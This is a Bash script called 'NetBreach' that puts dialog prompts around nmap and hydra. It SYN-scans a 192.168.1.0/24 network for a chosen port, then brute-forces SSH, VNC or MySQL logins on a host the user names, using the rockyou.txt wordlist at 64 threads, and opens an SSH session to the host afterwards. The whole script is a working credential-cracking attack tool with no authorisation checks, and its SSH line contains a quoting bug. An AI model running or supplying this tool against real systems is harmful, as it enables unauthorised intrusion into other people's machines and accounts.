#!/bin/bash

# Load variables
source DontEdit.sh

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Check for --help argument
show_help() {
    xmessage -center "HELP MENU\n\n
Programs Used:\n
- Hydra\n
- Nmap\n\n
How to Use:\n
1. Enter the port you want to scan.\n
2. If ports are open, provide a username and hostname.\n
3. The program will attempt to crack the given credentials.\n\n
Common Ports:\n
- SSH: 22\n
- VNC: 5900\n
- MySQL: 3306\n
To scan all ports, type 'ALL'."
    exit 0
}

# Function to check and install missing packages
install_missing_packages() {
    # Loop through required packages and check if they are installed
    for package in "${required_packages[@]}"; do
        if ! command_exists "${package}"; then
            # Prompt the user to install missing package
            response=$(xmessage -buttons "Yes:0,No:1" "Do you want to install the required package?")
            if [ "$?" -eq 0 ]; then
                bash requirements.sh  # Run script to install missing packages
                exit 1
            else
                exit 1
            fi
        fi
    done
}

# Internet connectivity check
check_internet() {
    if ! curl -s --head --fail https://google.com/ > /dev/null; then
        dialog --msgbox "Internet connection is required. Please check your connection." 10 40
        exit 1
    fi
}

# Main functionality
NetBreach() {
    
    port=$(dialog --inputbox "Enter the port to scan (SSH: 22, VNC: 5900, MySQL: 3306).\nType 'ALL' to scan all ports:" 10 40 3>&1 1>&2 2>&3)

    case "${port}" in
    ALL|all)
        xmessage -center "Scanning the entire network. This might take some time."
        sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
        ;;
    stop)
        xmessage -center "Exiting program."
        exit 0
        ;;
    *)
        if [[ ! "${port}" =~ ^[0-9]+$ ]]; then
            xmessage -center "Error: Invalid port number."
            exit 1
        fi
        sudo nmap -sS 192.168.1.1/24 -p "${port}" -oN "${port}.log" --open
        dialog --yesno "Do you want to open the scan results?" 10 40
        if [[ $? -eq 0 ]]; then
            xdg-open "${port}.log"
        fi
        ;;
    esac
}

# Crack service credentials
RunHackingCommand() {
    user=$(dialog --inputbox "Enter Username:" 10 40 3>&1 1>&2 2>&3)
    host=$(dialog --inputbox "Enter Hostname:" 10 40 3>&1 1>&2 2>&3)
    log_file="output.log"

    case "${port}" in
    22)
        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o "${log_file}" -I ssh://"$host":"$port"
    
        sleep 1
        echo "Cracking SSH credentials..."
        ssh "${user}"@"${host} -p ${port}"    
        ;;
    5900)
        hydra -P rockyou.txt -t 64 -vV -o "${log_file}" -I vnc://"$host":"$port"
        ;;
    3306)
        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o "${log_file}" -I mysql://"$host":"$port"
        ;;
    *)
        xmessage -center "Error: Unsupported port/service."
        return
        ;;
    esac
}

# Main execution flow
SKIP_INSTALL=false

for arg in "$@"; do
    case "$arg" in
        --skip)
            SKIP_INSTALL=true
            ;;
        --help|-h)
            show_help
            ;;
        *)
            dialog --msgbox "Unknown option: $arg" 10 40
            exit 1
            ;;
    esac
done

if ! $SKIP_INSTALL; then
    install_missing_packages
fi

check_internet
NetBreach
RunHackingCommand